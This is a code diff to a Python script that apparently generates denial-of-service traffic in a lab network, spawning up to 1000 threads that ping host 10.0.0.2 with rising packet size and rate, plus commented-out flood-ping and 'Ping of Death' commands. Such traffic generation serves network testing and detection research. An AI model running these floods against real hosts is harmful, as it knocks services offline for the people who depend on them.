@@ -14,6 +14,7 @@ import os
 """
 IP_H2 = "10.0.0.2"
 
+NUM_THREAD = 1000
 
 def ping_host(i):
     # Increase size for each ping
@@ -21,13 +22,15 @@ def ping_host(i):
         # ping without size
         subprocess.run(["ping", "-s", str(i), "-i", str(100/i),IP_H2])
 
-
 if __name__ == "__main__":
+    # Flood Ping
+    #subprocess.run(["ping", "-f", IP_H2])
+
+    # Ping of Death
+    # subprocess.run(["ping", IP_H2, "-s", "65500", "-t", "1", "-n", "1"])
+
     # The DoS Attack have to start after 10 minute so we want to perfrom a 15 minute test
-    t_end = time.time() + 60 * 5 # 300 s
-    i = 1
-    while time.time() < t_end:
-    #for i in range(1,1000):
+    for i in range(1,NUM_THREAD+1):
         worker = Thread(target=ping_host, args=(i,))
         workers = []
         workers.append(worker)
@@ -35,7 +38,7 @@ if __name__ == "__main__":
         worker.start()
         # Increase frequency for each ping
         sleep(1/i)
-        i += 1
+        #sleep(1)
     
     for w in workers:
         w.join()
